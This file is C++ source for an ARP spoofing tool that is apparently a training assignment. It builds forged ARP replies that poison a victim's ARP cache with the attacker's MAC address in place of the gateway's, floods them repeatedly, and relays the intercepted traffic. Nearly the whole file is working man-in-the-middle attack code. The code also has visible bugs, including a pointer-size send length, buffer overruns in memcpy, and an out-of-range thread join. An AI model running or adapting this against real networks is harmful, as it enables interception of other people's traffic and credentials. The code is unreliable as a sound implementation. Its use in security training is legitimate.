#include <iostream>
#include "hoon_header.h"

using namespace std;

eth_hdr *eth2 = (eth_hdr *)malloc(sizeof(eth_hdr));
arp_hdr *ath2 = (arp_hdr *)malloc(sizeof(arp_hdr));

arp_packet *Make_Arp_Packet(addr_info info, uint8_t *ip){
    arp_packet *Gpacket = (arp_packet *)malloc(sizeof(arp_packet));
    //sendARP to destination (Broadcast) -> destination mac
    for(int i = 0; i < 6; i++) Gpacket->eth.dst[i] = 0xff;
    memcpy(Gpacket->eth.src, info.My_mac, 6);
    memcpy(Gpacket->ath.Smac, info.My_mac, 6);

    //ARP type
    Gpacket->eth.type = ntohs(ETHERTYPE_ARP);
    //ARP HEADER
    Gpacket->ath.Htype = ntohs(ETHTYPE);
    Gpacket->ath.Ptype = ntohs(PROTOTYPE_IP);
    Gpacket->ath.H_add_len = 6;
    Gpacket->ath.P_add_len = 4;
    Gpacket->ath.Opcode = ntohs(REQUEST);
    //SIP
    memcpy(Gpacket->ath.SIP, info.My_IP, 4);
    //Tmac
    for(int i = 0; i < 6; i++) Gpacket->ath.Tmac[i] = 0x00;

    //TIP
    memcpy(Gpacket->ath.TIP, ip, 4);

    printf("Packet Successfully Made\n");
    return Gpacket;
}

arp_packet *Make_Infected_Packet(eth_hdr *eth2, arp_hdr *ath2, addr_info info){
    arp_packet *Ipacket = (arp_packet *)malloc(sizeof(arp_packet));

    memcpy(Ipacket->eth.src, info.My_mac, 6);
    memcpy(Ipacket->eth.dst, eth2->src, 6);

    memcpy(Ipacket->ath.Smac, info.My_mac, 6);
    memcpy(Ipacket->ath.SIP, info.Target_IP, 4);
    memcpy(Ipacket->ath.Tmac, ath2->Smac, 6);
    memcpy(Ipacket->ath.TIP, ath2->SIP, 4);

    Ipacket->eth.type = ntohs(ETHERTYPE_ARP);

    Ipacket->ath.Htype = ntohs(ETHTYPE);
    Ipacket->ath.Ptype = ntohs(PROTOTYPE_IP);
    Ipacket->ath.H_add_len = 6;
    Ipacket->ath.P_add_len = 4;
    Ipacket->ath.Opcode = ntohs(REPLY);

    printf("Infection Packet Ready\n");
    return Ipacket;
}

//get my netmask, mac, ip
void myinfoset(char *dev, uint8_t *ipstr, uint8_t *macstr, uint8_t *netmask){

    ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    ioctl(s, SIOCGIFNETMASK, &ifr);
    memcpy((char *)netmask, ifr.ifr_netmask.sa_data+2, 32);

    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 48);

    ioctl(s, SIOCGIFADDR, &ifr);
    memcpy((char *)ipstr, ifr.ifr_addr.sa_data+2, 32);

}

//divide input ip
void divide(uint8_t *dst, char *ar){
    uint32_t tmp;
    tmp = inet_addr(ar);
    memcpy(dst, &tmp, 4);
}

void Get_Res(pcap_t* handle, addr_info info, uint8_t *ip){
    printf("Got Response!!\n");
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);
        eth_hdr * eth_res = (eth_hdr *)packet;
        arp_hdr * arp_res = (arp_hdr *)(packet + sizeof(eth_hdr));

        if(eth_res->type == ntohs(ETHERTYPE_ARP) && arp_res->Opcode == ntohs(REPLY) && memcmp(ip, arp_res->SIP, 4) == 0){
            memcpy(eth2->src, arp_res->Smac, 6);
            memcpy(ath2->Smac, arp_res->Smac, 6);
            memcpy(ath2->SIP, arp_res->SIP, 4);
            break;
        }
        else{
            continue;
        }
    }
}

void Relay(pcap_t* handle, arp_packet *Ipacket, addr_info info){
    //need to change..
    //eth.dest my_mac => Target_mac
    //eth.src  sender_mac => my_mac
    printf("\n\nSending Relay Packet...\n");
    while(true){
        int a = 100;
        while(a) {
            pcap_sendpacket(handle, (u_char *)Ipacket, sizeof(Ipacket));
            a--;
        }
        u_char *relay_packet = (u_char *)malloc(1500);
        struct pcap_pkthdr* header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        printf("%u bytes captured\n", header->caplen);
        memcpy(relay_packet, packet, header->len);

        if(memcmp(info.My_mac, relay_packet, 6) == 0){
            printf("re infection...\n");
            while(a) {
                pcap_sendpacket(handle, (u_char *)Ipacket, sizeof(Ipacket));
                a--;
            }
            printf("receiver packet from server\n");
            memcpy(relay_packet, info.Target_mac, 6);
            memcpy(relay_packet + 6, info.My_mac, 6);

            pcap_sendpacket(handle, (const u_char *)relay_packet, header->len);
        }
    }
}

void printPacket(arp_packet *packet){
    printf("========================== Packet ============================\n");
    printf("Ethernet Header -> Destination Mac : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", packet->eth.dst[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("Ethernet Header -> Source Mac      : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", packet->eth.src[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("ARP Header -> Source Mac           : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", packet->ath.Smac[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("ARP Header -> Source IP            : ");
    for(int i = 0; i < 4; i++){
        printf("%d", packet->ath.SIP[i]);
        if(i == 3) printf("\n");
        else printf(".");
    }
    printf("ARP Header -> Target Mac           : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", packet->ath.Tmac[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("ARP Header -> Target IP            : ");
    for(int i = 0; i < 4; i++){
        printf("%d", packet->ath.TIP[i]);
        if(i == 3) printf("\n");
        else printf(".");
    }
    printf("\n");
}

void printInfo(addr_info info){
    printf("\n\n===================== Info Table =======================\n");
    printf("My Mac           : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", info.My_mac[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("My IP            : ");
    for(int i = 0; i < 4; i++){
        printf("%d", info.My_IP[i]);
        if(i == 3) printf("\n");
        else printf(".");
    }
    printf("Sender Mac       : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", info.Sender_mac[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("Sender IP        : ");
    for(int i = 0; i < 4; i++){
        printf("%d", info.Sender_IP[i]);
        if(i == 3) printf("\n");
        else printf(".");
    }
    printf("Target Mac       : ");
    for(int i = 0; i < 6; i++){
        printf("%02x", info.Target_mac[i]);
        if(i == 5) printf("\n");
        else printf(":");
    }
    printf("Target IP        : ");
    for(int i = 0; i < 4; i++){
        printf("%d", info.Target_IP[i]);
        if(i == 3) printf("\n");
        else printf(".");
    }
}

void ThreadF(char *dev, addr_info info, char **argv, int i){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if(handle == NULL){
        fprintf(stderr, "%s", errbuf);
    }

    int packet_len = SIZE_ARP_PACKET;
    divide(info.Sender_IP, argv[i + 2]);
    divide(info.Target_IP, argv[i + 3]);
    printf("\n");
    for(int j = 0; j < 4; j++){
        printf("%d.", info.Sender_IP[j]);
    }
    printf("\n");
    for(int j = 0; j < 4; j++){
        printf("%d.", info.Target_IP[j]);
    }
    printf("\n");

    printInfo(info);
    /*
     * send broadcast to get TIP's mac
     * and if get TIP's mac end function
    */
    arp_packet *Gpacket = Make_Arp_Packet(info, info.Sender_IP);
    printPacket(Gpacket);
    pcap_sendpacket(handle, (u_char*)Gpacket, packet_len);
    Get_Res(handle, info, info.Sender_IP);
    memcpy(info.Sender_mac, ath2->Smac, 6);

    if(pcap_sendpacket(handle, (u_char*)Gpacket, packet_len)){
        fprintf(stderr, "Err : ", pcap_geterr(handle));
    }


    /*
     * send ARP Table infection Packet
    */


    printf("Starting Infection...\n\n");
    arp_packet *Ipacket = Make_Infected_Packet(eth2, ath2, info);
    printPacket(Ipacket);
    int c = 100;
    while(c){
        pcap_sendpacket(handle, (u_char *)Ipacket, packet_len);
        c--;
    }

    /*
     * send packet to gateway for gateway's mac
    */
    arp_packet *Upacket = Make_Arp_Packet(info, info.Target_IP);
    printPacket(Upacket);
    pcap_sendpacket(handle, (u_char*)Upacket, packet_len);
    Get_Res(handle, info, info.Target_IP);
    memcpy(info.Target_mac, ath2->Smac, 6);
    printInfo(info);

    Relay(handle, Ipacket, info);

    printf("\n");
}

int main(int argc, char* argv[]){
    if (argc < 4) {
      printf("try again\n");
      return -1;
    }
    char track[] = "취약점";
    char name[] = "남훈";
    printf("[bob8][%s]ARP_Spoofing[%s]\n", track, name);   

    char* dev = argv[1];

    uint8_t *my_ip = new uint8_t[4];
    uint8_t *my_mac = new uint8_t[6];
    uint8_t *netmask = new uint8_t[4];
    myinfoset(dev, my_ip, my_mac, netmask);
    int count = (argc - 2) / 2;
    addr_info *info = new addr_info[count + 1] ;
    for(int i = 1; i <= count; i++){
        memcpy(info[i].My_IP, my_ip, 4);
        memcpy(info[i].My_mac, my_mac, 6);
    }

    vector<thread> arp;


    for(int i = 1; i <= count; i++)
        arp.push_back(thread(ThreadF, dev, info[i], argv, i));
    for(int i = 1; i <= count; i++) {
        printf("Thread %d start", i);
        arp[i].join();
    }
    return 0;
}
